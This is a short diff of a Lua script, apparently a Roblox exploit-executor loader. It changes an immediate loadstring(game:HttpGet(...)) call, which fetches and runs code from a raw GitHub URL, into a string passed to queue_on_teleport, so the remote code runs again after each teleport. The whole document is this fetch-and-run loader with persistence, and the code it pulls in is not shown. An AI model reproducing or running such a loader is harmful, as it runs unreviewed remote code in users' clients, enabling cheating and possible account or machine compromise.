@@ -1,4 +1,4 @@
-local scriptCode = loadstring(game:HttpGet("https://raw.githubusercontent.com/bossvegas2012-design/A/refs/heads/main/B"))()
+local scriptCode = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/bossvegas2012-design/A/refs/heads/main/B"))()'
 
 if queue_on_teleport then
     queue_on_teleport(scriptCode)
